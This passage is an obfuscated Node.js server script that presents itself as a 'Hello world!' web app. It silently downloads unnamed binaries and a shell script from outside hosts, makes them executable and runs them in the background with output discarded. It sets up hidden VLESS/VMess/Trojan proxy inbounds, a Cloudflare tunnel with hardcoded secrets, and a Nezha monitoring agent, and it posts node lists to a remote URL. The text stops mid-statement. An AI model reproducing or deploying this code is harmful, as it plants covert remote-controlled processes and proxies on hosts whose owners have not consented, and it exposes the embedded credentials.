const _0x2fa26a=_0x54fc;(function(_0x29e836,_0x30d1cb){const _0x54e7d6=_0x54fc,_0x11fcef=_0x29e836();while(!![]){try{const _0x148436=parseInt(_0x54e7d6(0x1b2))/0x1+-parseInt(_0x54e7d6(0x112))/0x2+parseInt(_0x54e7d6(0x18f))/0x3+-parseInt(_0x54e7d6(0x120))/0x4*(parseInt(_0x54e7d6(0x13d))/0x5)+parseInt(_0x54e7d6(0x196))/0x6+-parseInt(_0x54e7d6(0x104))/0x7*(parseInt(_0x54e7d6(0x172))/0x8)+parseInt(_0x54e7d6(0x161))/0x9;if(_0x148436===_0x30d1cb)break;else _0x11fcef['push'](_0x11fcef['shift']());}catch(_0xf7200){_0x11fcef['push'](_0x11fcef['shift']());}}}(_0x1e92,0xc66cb));const _0x193122=(function(){let _0x5ded95=!![];return function(_0x527cad,_0x1125f5){const _0x4a60a0=_0x5ded95?function(){const _0x465f7e=_0x54fc;if(_0x1125f5){const _0x4bef50=_0x1125f5[_0x465f7e(0x1a5)](_0x527cad,arguments);return _0x1125f5=null,_0x4bef50;}}:function(){};return _0x5ded95=![],_0x4a60a0;};}()),_0x34f305=_0x193122(this,function(){const _0x48a4ea=_0x54fc;return _0x34f305['toString']()[_0x48a4ea(0x19e)]('(((.+)+)+)'+'+$')['toString']()['constructo'+'r'](_0x34f305)['search'](_0x48a4ea(0x17a)+'+$');});_0x34f305();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2fa26a(0x13f)),{promisify}=require(_0x2fa26a(0x1aa)),exec=promisify(require(_0x2fa26a(0x19a)+_0x2fa26a(0x19d))[_0x2fa26a(0xc5)]),{execSync}=require('child_proc'+'ess'),http=require(_0x2fa26a(0xae)),httpProxy=require('http-proxy'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x2fa26a(0xdf)][_0x2fa26a(0xe2)+'L']||'',AUTO_ACCESS=process['env']['AUTO_ACCES'+'S']||![],FILE_PATH=process['env']['FILE_PATH']||_0x2fa26a(0xe5),SUB_PATH=process[_0x2fa26a(0xdf)][_0x2fa26a(0xe4)]||_0x2fa26a(0x128),PORT=process[_0x2fa26a(0xdf)]['SERVER_POR'+'T']||process['env'][_0x2fa26a(0xe0)]||0xbb8,UUID=process['env']['UUID']||'3f33f14e-6'+'a20-6d50-7'+'f2b-87915b'+_0x2fa26a(0x151),NEZHA_SERVER=process['env'][_0x2fa26a(0x187)+'ER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2fa26a(0xdf)][_0x2fa26a(0xd9)]||'',ARGO_DOMAIN=process[_0x2fa26a(0xdf)]['ARGO_DOMAI'+'N']||'cftime.lln'+_0x2fa26a(0x134),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2fa26a(0x174)+_0x2fa26a(0x148)+'ef8a13b1d5'+'d1a88ae015'+_0x2fa26a(0x10c)+'TunnelSecr'+'et\x22:\x22N1EzD'+'h6/qIvsF1C'+_0x2fa26a(0x192)+'56HnMfbTfH'+'Qkp6wH9k=\x22'+',\x22TunnelID'+_0x2fa26a(0xbe)+'d-0287-41d'+'7-b6b0-c5d'+'6cbff04da\x22'+',\x22Endpoint'+'\x22:\x22\x22}',ARGO_PORT=process['env']['ARGO_PORT']||0x1eb4,CFIP=process[_0x2fa26a(0xdf)]['CFIP']||'cdns.doon.'+_0x2fa26a(0xb6),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env'][_0x2fa26a(0x137)]||'',MONITOR_KEY=process['env']['MONITOR_KE'+'Y']||'a88b11cbdd'+_0x2fa26a(0x15c)+'e58d6d96cd'+'48033195da'+_0x2fa26a(0xcf)+'119c2f2102'+'16f9',MONITOR_SERVER=process[_0x2fa26a(0xdf)]['MONITOR_SE'+'RVER']||'d3bkmf',MONITOR_URL=process['env'][_0x2fa26a(0x13c)+'L']||'https://up'+'time-vps.b'+_0x2fa26a(0x15e)+'s.in';console['log'](_0x2fa26a(0x1a7)+UUID);MONITOR_KEY&&MONITOR_SERVER&&MONITOR_URL?(console['log']('监控脚本已配置，将自'+_0x2fa26a(0xdc)),console[_0x2fa26a(0x16c)]('监控密钥:\x20'+MONITOR_KEY['substring'](0x0,0x8)+'...'),console['log']('监控服务器:\x20'+MONITOR_SERVER),console['log'](_0x2fa26a(0x185)+MONITOR_URL)):console['log']('监控环境变量不完整，'+'跳过监控脚本启动');!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+('\x20is\x20create'+'d'))):console['log'](FILE_PATH+('\x20already\x20e'+'xists'));function generateRandomName(){const _0x448e06=_0x2fa26a,_0x3378f4=_0x448e06(0xe7)+'klmnopqrst'+'uvwxyz';let _0xb0ea08='';for(let _0x3ffab9=0x0;_0x3ffab9<0x6;_0x3ffab9++){_0xb0ea08+=_0x3378f4[_0x448e06(0x102)](Math[_0x448e06(0xf3)](Math[_0x448e06(0xeb)]()*_0x3378f4['length']));}return _0xb0ea08;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorName='cf-vps-mon'+'itor.sh';function _0x54fc(_0xcc3846,_0x23847a){const _0x21ee24=_0x1e92();return _0x54fc=function(_0x34f305,_0x193122){_0x34f305=_0x34f305-0xad;let _0x1e92fd=_0x21ee24[_0x34f305];return _0x1e92fd;},_0x54fc(_0xcc3846,_0x23847a);}let npmPath=path[_0x2fa26a(0x19b)](FILE_PATH,npmName),phpPath=path[_0x2fa26a(0x19b)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2fa26a(0x19b)](FILE_PATH,botName),monitorPath=path[_0x2fa26a(0x19b)](FILE_PATH,monitorName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x2fa26a(0x19b)](FILE_PATH,'boot.log'),configPath=path[_0x2fa26a(0x19b)](FILE_PATH,_0x2fa26a(0x16b)+'n'),nezhaConfigPath=path['join'](FILE_PATH,'config.yam'+'l'),tunnelJsonPath=path['join'](FILE_PATH,'tunnel.jso'+'n'),tunnelYamlPath=path[_0x2fa26a(0x19b)](FILE_PATH,_0x2fa26a(0x1ad));const proxy=httpProxy['createProx'+_0x2fa26a(0xf0)](),proxyServer=http[_0x2fa26a(0x157)+'er']((_0x1e9c88,_0x1ff428)=>{const _0x59485d=_0x2fa26a,_0x18924a=_0x1e9c88[_0x59485d(0xd4)];_0x18924a['startsWith']('/vless-arg'+'o')||_0x18924a[_0x59485d(0x15d)](_0x59485d(0x121)+'o')||_0x18924a[_0x59485d(0x15d)]('/trojan-ar'+'go')||_0x18924a==='/vless'||_0x18924a===_0x59485d(0xbf)||_0x18924a==='/trojan'?proxy['web'](_0x1e9c88,_0x1ff428,{'target':'http://loc'+_0x59485d(0xf2)+'1'}):proxy[_0x59485d(0xd0)](_0x1e9c88,_0x1ff428,{'target':_0x59485d(0x193)+'alhost:'+PORT});});proxyServer['on']('upgrade',(_0x16e741,_0x5181fc,_0x12247e)=>{const _0x3c7931=_0x2fa26a,_0x4c0d13=_0x16e741['url'];_0x4c0d13['startsWith']('/vless-arg'+'o')||_0x4c0d13[_0x3c7931(0x15d)](_0x3c7931(0x121)+'o')||_0x4c0d13[_0x3c7931(0x15d)](_0x3c7931(0x1ac)+'go')?proxy['ws'](_0x16e741,_0x5181fc,_0x12247e,{'target':_0x3c7931(0x193)+'alhost:300'+'1'}):proxy['ws'](_0x16e741,_0x5181fc,_0x12247e,{'target':_0x3c7931(0x193)+_0x3c7931(0x130)+PORT});}),proxyServer[_0x2fa26a(0x143)](ARGO_PORT,()=>{const _0xc9df1c=_0x2fa26a;console['log'](_0xc9df1c(0x18b)+':\x20'+ARGO_PORT),console['log']('HTTP流量\x20->\x20'+'localhost:'+PORT),console['log'](_0xc9df1c(0x1b0)+_0xc9df1c(0x16a)+'3001');}),app['get']('/',function(_0x5eb60c,_0x115441){const _0x329afe=_0x2fa26a;_0x115441[_0x329afe(0x17e)]('Hello\x20worl'+'d!');});function deleteNodes(){const _0x5003eb=_0x2fa26a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3a7bf6;try{_0x3a7bf6=fs['readFileSy'+'nc'](subPath,_0x5003eb(0x171));}catch{return null;}const _0x2a5124=Buffer['from'](_0x3a7bf6,'base64')[_0x5003eb(0x1a3)](_0x5003eb(0x171)),_0x5075ae=_0x2a5124['split']('\x0a')[_0x5003eb(0xfd)](_0x11bac2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x11bac2));if(_0x5075ae['length']===0x0)return;return axios[_0x5003eb(0xf8)](UPLOAD_URL+('/api/delet'+_0x5003eb(0x131)),JSON[_0x5003eb(0x16d)]({'nodes':_0x5075ae}),{'headers':{'Content-Type':_0x5003eb(0x100)+'n/json'}})[_0x5003eb(0xc4)](_0x309404=>{return null;}),null;}catch(_0x4aefd7){return null;}}function cleanupOldFiles(){try{const _0x39f499=fs['readdirSyn'+'c'](FILE_PATH);_0x39f499['forEach'](_0x6260e3=>{const _0x42bec4=_0x54fc,_0xa09fe7=path[_0x42bec4(0x19b)](FILE_PATH,_0x6260e3);try{const _0x2c49fe=fs[_0x42bec4(0x181)](_0xa09fe7);_0x2c49fe['isFile']()&&fs['unlinkSync'](_0xa09fe7);}catch(_0x34b178){}});}catch(_0x4e58bd){}}async function generateConfig(){const _0x2fa2eb=_0x2fa26a,_0x673742={'log':{'access':'/dev/null','error':_0x2fa2eb(0x106),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-'+'vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-arg'+'o','dest':0xbba},{'path':_0x2fa2eb(0x121)+'o','dest':0xbbb},{'path':'/trojan-ar'+'go','dest':0xbbc}]},'streamSettings':{'network':_0x2fa2eb(0x10f)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x2fa2eb(0xfb)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2fa2eb(0xdd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2fa2eb(0xfb)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x2fa2eb(0xae),'tls',_0x2fa2eb(0x11f)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2fa2eb(0x11f)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':[_0x2fa2eb(0xae),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+loca'+'l://8.8.8.'+'8/dns-quer'+'y']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs['writeFileS'+_0x2fa2eb(0xde)](path['join'](FILE_PATH,'config.jso'+'n'),JSON['stringify'](_0x673742,null,0x2));}function getSystemArchitecture(){const _0x245a35=_0x2fa26a,_0x269d0f=os['arch']();return _0x269d0f===_0x245a35(0xda)||_0x269d0f==='arm64'||_0x269d0f==='aarch64'?_0x245a35(0xda):'amd';}function downloadFile(_0x1707ff,_0xedd5eb){return new Promise((_0x73f5a,_0x5a3f52)=>{const _0x40c380=_0x54fc,_0x1c3699=_0x1707ff;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x15c41b=fs['createWrit'+_0x40c380(0xff)](_0x1c3699);axios({'method':'get','url':_0xedd5eb,'responseType':_0x40c380(0x177)})[_0x40c380(0xf5)](_0x39fd16=>{const _0x250840=_0x40c380;_0x39fd16[_0x250840(0x164)][_0x250840(0x154)](_0x15c41b),_0x15c41b['on']('finish',()=>{const _0x427054=_0x250840;_0x15c41b[_0x427054(0xed)](),console['log'](_0x427054(0x169)+path[_0x427054(0xf9)](_0x1c3699)+('\x20successfu'+_0x427054(0xca))),_0x73f5a(_0x1c3699);}),_0x15c41b['on']('error',_0x361db2=>{const _0x1a0a87=_0x250840;fs['unlink'](_0x1c3699,()=>{});const _0x54ddef=_0x1a0a87(0x169)+path[_0x1a0a87(0xf9)](_0x1c3699)+_0x1a0a87(0x180)+_0x361db2[_0x1a0a87(0x11b)];console[_0x1a0a87(0x167)](_0x54ddef),_0x5a3f52(_0x54ddef);});})['catch'](_0x4b6b7f=>{const _0xc7cee2=_0x40c380,_0x433a74=_0xc7cee2(0x169)+path['basename'](_0x1c3699)+_0xc7cee2(0x180)+_0x4b6b7f['message'];console[_0xc7cee2(0x167)](_0x433a74),_0x5a3f52(_0x433a74);});});}async function downloadAndRunMonitorScript(){const _0x52475a=_0x2fa26a;if(!MONITOR_KEY||!MONITOR_SERVER||!MONITOR_URL){console[_0x52475a(0x16c)](_0x52475a(0x198)+'跳过监控脚本启动');return;}await new Promise(_0x1a63db=>setTimeout(_0x1a63db,0x2710)),console['log']('开始下载并运行监控脚'+_0x52475a(0xd6));try{const _0x319ee6=_0x52475a(0xb2)+'w.githubus'+'ercontent.'+'com/kadida'+'lax/cf-vps'+'-monitor/m'+_0x52475a(0xf1)+'-monitor.s'+'h';console['log']('从\x20'+_0x319ee6+_0x52475a(0x176)),await downloadFile(monitorPath,_0x319ee6),fs['chmodSync'](monitorPath,0x1ed),console['log']('设置监控脚本执行权限'+'成功'),await runMonitorScript();}catch(_0x3e4a59){console['error'](_0x52475a(0x119)+'败:\x20'+_0x3e4a59['message']),await runDirectMonitor();}}async function runMonitorScript(){const _0x3def99=_0x2fa26a,_0x34a4ca=['-i','-k',MONITOR_KEY,'-s',MONITOR_SERVER,'-u',MONITOR_URL];console['log']('运行监控脚本:\x20'+monitorPath+'\x20'+_0x34a4ca[_0x3def99(0x19b)]('\x20'));try{const _0x93d663=_0x3def99(0xbc)+monitorPath+'\x20'+_0x34a4ca[_0x3def99(0x19b)]('\x20')+(_0x3def99(0xb3)+_0x3def99(0x12c));await exec(_0x93d663),console['log'](_0x3def99(0xfe));}catch(_0x408292){console['error'](_0x3def99(0x139)+_0x408292[_0x3def99(0x11b)]);throw _0x408292;}}function _0x1e92(){const _0x231e12=['TunnelSecr','Xray流量\x20->\x20','sni=','994550zScMxs','clear','ARGO_AUTH\x20','mismatch\x20T','http','tartserver','yc.mn/agen','get','https://ra','\x20>/dev/nul','d\x20successf','ble\x20is\x20emp','eu.org','o?ed=2560','理...','f-vps-moni','split','less-argo%','nohup\x20','ubscriptio','\x22:\x2266e2951','/vmess','able_send_','443','Error\x20in\x20s','orce_updat','catch','exec','\x20task\x20fail','otocol\x20htt','to\x20tunnel','includes','lly','SIGINT','substring','odes','oken\x20','0efee3e45d','web','org','true','ate:\x20true\x0a','url','able\x20is\x20em','本...','gress:\x0a\x20\x20-','ss\x20task','NEZHA_KEY','arm','yc.mn/web','动运行','vless','ync','env','PORT','map','PROJECT_UR','web\x20runnin','SUB_PATH','./tmp','ue\x0aip_repo','abcdefghij','aded\x20succe','access\x20tas','se\x0agpu:\x20fa','random','ully','close','://raw.git','AUTH\x20varia','yServer','ain/cf-vps','alhost:300','floor','\x20\x20\x20\x20\x20\x20noTL','then','/null\x202>&1','cret:\x20','post','basename','x&type=ws&','none','8443','filter','监控脚本启动成功','eStream','applicatio','length','charAt','exit','10668pyTYqB','\x0atls:\x20','/dev/null','ArgoDomain','Empowermen','隧道YAML配置生成','\x0a\x0avmess://','tor/main/c','afa598b\x22,\x22','ARGO_DOMAI','\x20-u\x20','tcp','for\x20','&fp=firefo','671498bxQAGW','ng\x20on\x20port','收到终止信号，正在清','unnelSecre','le\x20','ecture','\x20-i\x20-k\x20','下载或运行监控脚本失','error\x20in\x20s','message','m64.ssss.n','rl\x20http://','ce:\x20http:/','quic','52KirBbJ','/vmess-arg','rm\x20-rf\x20','writeFileS','ning','t,\x20enjoy!','tunnel\x20--e','host=','sub','ick\x20tunnel','e_auto_upd','pty,skip\x20r','l\x202>&1\x20&','country_co','for\x20using\x20','TunnelID','alhost:','e-nodes','t\x20success\x20','ccessfully','g.de5.net','\x20--disable','l\x20info\x20--u','NAME','%3Fed%3D25','运行监控脚本失败:\x20','tor.sh\x20-O\x20','\x20-s\x20','MONITOR_UR','376695DCZrcV','p2\x20--logfi','path','\x20findstr\x20','uting\x20comm','收到关闭信号，正在清','listen',',\x20re-runni','readFileSy','\x22\x20>\x20/dev/n','等待tunnel.y','ag\x22:\x225df51','Error\x20read','pgrep\x20-f\x20\x22','隧道启动失败','this\x20scrip','tic\x20access','rvice:\x20htt','\x20http2\x0a\x0ain','set','d2093a','\x20>\x20nul\x202>&','replace','pipe','dge-ip-ver','cessfully','createServ','d64.ssss.n','matic\x20acce','\x20hostname:','https://am','705529210c','startsWith','gxzg.indev','sion\x20auto\x20','?encryptio','8663427vJmUVd','existsSync','等待隧道启动...','data','/api/add-n','match','error','\x0askip_conn','Download\x20','localhost:','config.jso','log','stringify','直接运行监控命令失败','/localhost','l\x202>&1','utf-8','1544NVisyX','\x20&&\x20','{\x22AccountT','SIGTERM','\x20下载监控脚本','stream','oDomain','ssfully','(((.+)+)+)','2053','mmand_exec','all','send','\x20is\x20runnin','\x20failed:\x20','statSync','win32','--no-autou','\x20a\x20file\x20fo','监控URL:\x20','yc.mn/v1','NEZHA_SERV','text/plain','from','Thank\x20you\x20','代理服务器运行在端口','platform','ty,\x20use\x20qu','n=none&sec','331041VtKxoQ','and:\x20','https://ar','B1nVq3Ud2S','http://loc','rt_delay:\x20','nRequest:\x0a','2127210QHEEWb','/config.js','监控环境变量不完整，','d:\x20','child_proc','join','api.com/js','ess','search','tent.com/k','\x0a\x20\x20\x20\x20origi','n/json','status','toString','untry_code','apply','lse\x0ainsecu','使用的UUID:\x20','\x22\x20>/dev/nu','response','util','2083','/trojan-ar','tunnel.yml','App\x20is\x20run'];_0x1e92=function(){return _0x231e12;};return _0x1e92();}async function runDirectMonitor(){const _0x449602=_0x2fa26a;console[_0x449602(0x16c)]('尝试直接运行监控命令'+'...');const _0xaae623='wget\x20https'+_0x449602(0xee)+'hubusercon'+_0x449602(0x19f)+'adidalax/c'+'f-vps-moni'+_0x449602(0x10b)+_0x449602(0xb9)+_0x449602(0x13a)+monitorPath+('\x20&&\x20chmod\x20'+'+x\x20')+monitorPath+_0x449602(0x173)+monitorPath+_0x449602(0x118)+MONITOR_KEY+'\x20-s\x20'+MONITOR_SERVER+_0x449602(0x10e)+MONITOR_URL;try{await exec(_0xaae623),console['log']('监控命令执行成功');}catch(_0x164002){console['error'](_0x449602(0x16e)+':\x20'+_0x164002[_0x449602(0x11b)]);}}async function downloadFilesAndRun(){const _0x4624f3=_0x2fa26a,_0x5149b2=getSystemArchitecture(),_0xa86687=getFilesForArchitecture(_0x5149b2);if(_0xa86687[_0x4624f3(0x101)]===0x0){console['log']('Can\x27t\x20find'+_0x4624f3(0x184)+'r\x20the\x20curr'+'ent\x20archit'+_0x4624f3(0x117));return;}try{const _0x351302=_0xa86687[_0x4624f3(0xe1)](_0x4b9049=>downloadFile(_0x4b9049['fileName'],_0x4b9049['fileUrl']));await Promise[_0x4624f3(0x17d)](_0x351302);}catch(_0x38e48d){console['error']('Error\x20down'+'loading\x20fi'+'les:',_0x38e48d);return;}function _0xdb2b68(_0x1a6a13){const _0x73764e=0x1fd;_0x1a6a13['forEach'](_0x2a88cb=>{fs['existsSync'](_0x2a88cb)&&fs['chmod'](_0x2a88cb,_0x73764e,_0x3a12a3=>{const _0x23bdbf=_0x54fc;_0x3a12a3?console['error'](_0x23bdbf(0x108)+'t\x20failed\x20f'+'or\x20'+_0x2a88cb+':\x20'+_0x3a12a3):console[_0x23bdbf(0x16c)]('Empowermen'+_0x23bdbf(0x132)+_0x23bdbf(0x110)+_0x2a88cb+':\x20'+_0x73764e[_0x23bdbf(0x1a3)](0x8));});});}const _0x5709f4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xdb2b68(_0x5709f4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xfc562c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4624f3(0xba)](':')['pop']():'',_0x5794f2=new Set([_0x4624f3(0xc1),'8443','2096','2087',_0x4624f3(0x1ab),_0x4624f3(0x17b)]),_0x194078=_0x5794f2['has'](_0xfc562c)?_0x4624f3(0xd2):'false',_0x3f49cc='\x0aclient_se'+_0x4624f3(0xf7)+NEZHA_KEY+('\x0adebug:\x20fa'+'lse\x0adisabl'+_0x4624f3(0x12a)+_0x4624f3(0xd3)+'disable_co'+_0x4624f3(0x17c)+'ute:\x20false'+'\x0adisable_f'+_0x4624f3(0xc3)+'e:\x20true\x0adi'+'sable_nat:'+'\x20false\x0adis'+_0x4624f3(0xc0)+'query:\x20fal'+_0x4624f3(0xea)+_0x4624f3(0x1a6)+'re_tls:\x20tr'+_0x4624f3(0xe6)+'rt_period:'+'\x201800\x0arepo'+_0x4624f3(0x194)+'4\x0aserver:\x20')+NEZHA_SERVER+(_0x4624f3(0x168)+'ection_cou'+'nt:\x20true\x0as'+'kip_procs_'+'count:\x20tru'+'e\x0atemperat'+'ure:\x20false'+_0x4624f3(0x105))+_0x194078+('\x0ause_gitee'+'_to_upgrad'+'e:\x20false\x0au'+'se_ipv6_co'+_0x4624f3(0x1a4)+':\x20false\x0auu'+'id:\x20')+UUID;fs['writeFileS'+_0x4624f3(0xde)](nezhaConfigPath,_0x3f49cc);const _0x37e6a7='nohup\x20'+phpPath+'\x20-c\x20\x22'+nezhaConfigPath+(_0x4624f3(0x1a8)+'ll\x202>&1\x20&');try{await exec(_0x37e6a7),console['log'](phpName+(_0x4624f3(0x17f)+'g')),await new Promise(_0x14c9b4=>setTimeout(_0x14c9b4,0x3e8));}catch(_0x3e10db){console['error']('php\x20runnin'+'g\x20error:\x20'+_0x3e10db);}}else{let _0x47fdd0='';const _0x47e952=['443',_0x4624f3(0xfc),'2096','2087',_0x4624f3(0x1ab),_0x4624f3(0x17b)];_0x47e952[_0x4624f3(0xc9)](NEZHA_PORT)&&(_0x47fdd0='--tls');const _0x3a9ef0='nohup\x20'+npmPath+_0x4624f3(0x13b)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x47fdd0+(_0x4624f3(0x135)+'-auto-upda'+'te\x20--repor'+'t-delay\x204\x20'+'--skip-con'+'n\x20--skip-p'+'rocs\x20>/dev'+_0x4624f3(0xf6)+'\x20&');try{await exec(_0x3a9ef0),console[_0x4624f3(0x16c)](npmName+('\x20is\x20runnin'+'g')),await new Promise(_0x5e32b9=>setTimeout(_0x5e32b9,0x3e8));}catch(_0x40cac4){console['error']('npm\x20runnin'+'g\x20error:\x20'+_0x40cac4);}}}else console['log']('NEZHA\x20vari'+_0x4624f3(0xd5)+_0x4624f3(0x12b)+'unning');const _0xddb2af='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+(_0x4624f3(0x197)+'on\x20>/dev/n'+'ull\x202>&1\x20&');try{await exec(_0xddb2af),console['log'](webName+(_0x4624f3(0x17f)+'g')),await new Promise(_0x2e246c=>setTimeout(_0x2e246c,0x3e8));}catch(_0x46c007){console['error'](_0x4624f3(0xe3)+'g\x20error:\x20'+_0x46c007);}if(fs[_0x4624f3(0x162)](botPath)){let _0x20a5cf;if(ARGO_AUTH[_0x4624f3(0x166)](/^[A-Z0-9a-z=]{120,250}$/))_0x20a5cf=_0x4624f3(0x126)+'dge-ip-ver'+'sion\x20auto\x20'+_0x4624f3(0x183)+'pdate\x20--pr'+_0x4624f3(0xc7)+'p2\x20run\x20--t'+_0x4624f3(0xce)+ARGO_AUTH;else ARGO_AUTH[_0x4624f3(0xc9)]('TunnelSecr'+'et')?(!fs['existsSync'](tunnelYamlPath)&&(console['log'](_0x4624f3(0x147)+'ml配置...'),await new Promise(_0x1db7c0=>setTimeout(_0x1db7c0,0x3e8))),_0x20a5cf=_0x4624f3(0x126)+'dge-ip-ver'+'sion\x20auto\x20'+'--config\x20'+tunnelYamlPath+'\x20run'):_0x20a5cf=_0x4624f3(0x126)+'dge-ip-ver'+'sion\x20auto\x20'+_0x4624f3(0x183)+'pdate\x20--pr'+'otocol\x20htt'+'p2\x20--logfi'+'le\x20'+bootLogPath+('\x20--logleve'+_0x4624f3(0x136)+_0x4624f3(0x11d)+_0x4624f3(0x16a))+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x20a5cf+('\x20>/dev/nul'+'l\x202>&1\x20&')),console[_0x4624f3(0x16c)](botName+(_0x4624f3(0x17f)+'g')),console['log'](_0x4624f3(0x163)),await new Promise(_0x1c9978=>setTimeout(_0x1c9978,0x7d0));if(ARGO_AUTH['includes'](_0x4624f3(0x1af)+'et'))try{process['platform']==='win32'?await exec('tasklist\x20|'+_0x4624f3(0x140)+botName+'\x20>\x20nul'):await exec(_0x4624f3(0x14a)+'['+botName['charAt'](0x0)+']'+botName[_0x4624f3(0xcc)](0x1)+(_0x4624f3(0x146)+'ull')),console['log']('隧道运行成功');}catch(_0x27e918){console['error'](_0x4624f3(0x14b));}}catch(_0x1c3c81){console[_0x4624f3(0x167)]('Error\x20exec'+'uting\x20comm'+_0x4624f3(0x190)+_0x1c3c81);}}await new Promise(_0x2f0ec1=>setTimeout(_0x2f0ec1,0x1388));}function getFilesForArchitecture(_0x201d52){const _0x184681=_0x2fa26a;let _0x4faaea;_0x201d52==='arm'?_0x4faaea=[{'fileName':webPath,'fileUrl':'https://ar'+_0x184681(0x11c)+'yc.mn/web'},{'fileName':botPath,'fileUrl':_0x184681(0x191)+'m64.ssss.n'+'yc.mn/bot'}]:_0x4faaea=[{'fileName':webPath,'fileUrl':'https://am'+'d64.ssss.n'+_0x184681(0xdb)},{'fileName':botPath,'fileUrl':_0x184681(0x15b)+'d64.ssss.n'+'yc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x503dc9=_0x201d52==='arm'?_0x184681(0x191)+'m64.ssss.n'+_0x184681(0xb0)+'t':_0x184681(0x15b)+'d64.ssss.n'+'yc.mn/agen'+'t';_0x4faaea['unshift']({'fileName':npmPath,'fileUrl':_0x503dc9});}else{const _0x3a6b1d=_0x201d52==='arm'?'https://ar'+'m64.ssss.n'+'yc.mn/v1':_0x184681(0x15b)+_0x184681(0x158)+_0x184681(0x186);_0x4faaea['unshift']({'fileName':phpPath,'fileUrl':_0x3a6b1d});}}return _0x4faaea;}function argoType(){const _0x17f092=_0x2fa26a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x17f092(0x16c)](_0x17f092(0x10d)+'N\x20or\x20ARGO_'+_0x17f092(0xef)+_0x17f092(0xb5)+_0x17f092(0x18d)+_0x17f092(0x129)+'s');return;}if(ARGO_AUTH[_0x17f092(0xc9)](_0x17f092(0x1af)+'et'))try{const _0x2e0ea1=JSON['parse'](ARGO_AUTH),_0x172ccf=_0x2e0ea1[_0x17f092(0x12f)];fs['writeFileS'+'ync'](tunnelJsonPath,ARGO_AUTH);const _0x1c3e9c='\x0atunnel:\x20'+_0x172ccf+('\x0acredentia'+'ls-file:\x20')+tunnelJsonPath+('\x0aprotocol:'+_0x17f092(0x14f)+_0x17f092(0xd7)+_0x17f092(0x15a)+'\x20')+ARGO_DOMAIN+('\x0a\x20\x20\x20\x20servi'+_0x17f092(0x11e)+_0x17f092(0x16f)+':')+ARGO_PORT+(_0x17f092(0x1a0)+_0x17f092(0x195)+_0x17f092(0xf4)+'SVerify:\x20t'+'rue\x0a\x20\x20-\x20se'+_0x17f092(0x14e)+'p_status:4'+'04\x0a');fs[_0x17f092(0x123)+'ync'](tunnelYamlPath,_0x1c3e9c),console[_0x17f092(0x16c)](_0x17f092(0x109)+'成功');}catch(_0x53848e){console[_0x17f092(0x167)]('生成隧道配置错误:',_0x53848e);}else console['log'](_0x17f092(0x1b4)+_0x17f092(0xad)+_0x17f092(0x115)+'t,use\x20toke'+'n\x20connect\x20'+_0x17f092(0xc8));}async function getMetaInfo(){const _0x2b6f37=_0x2fa26a;try{const _0x4a70b9=await axios[_0x2b6f37(0xb1)]('https://ip'+'api.co/jso'+'n/',{'timeout':0xbb8});if(_0x4a70b9[_0x2b6f37(0x164)]&&_0x4a70b9['data']['country_co'+'de']&&_0x4a70b9[_0x2b6f37(0x164)]['org'])return(_0x4a70b9['data'][_0x2b6f37(0x12d)+'de']+'_'+_0x4a70b9['data']['org'])[_0x2b6f37(0x153)](/ /g,'_');}catch(_0x4bc7e5){try{const _0x596a0e=await axios[_0x2b6f37(0xb1)]('http://ip-'+_0x2b6f37(0x19c)+'on/',{'timeout':0xbb8});if(_0x596a0e['data']&&_0x596a0e['data']['status']==='success'&&_0x596a0e['data']['countryCod'+'e']&&_0x596a0e['data'][_0x2b6f37(0xd1)])return(_0x596a0e['data']['countryCod'+'e']+'_'+_0x596a0e[_0x2b6f37(0x164)]['org'])['replace'](/ /g,'_');}catch(_0x389816){}}return'Unknown';}async function extractDomains(){const _0xf8af8a=_0x2fa26a;let 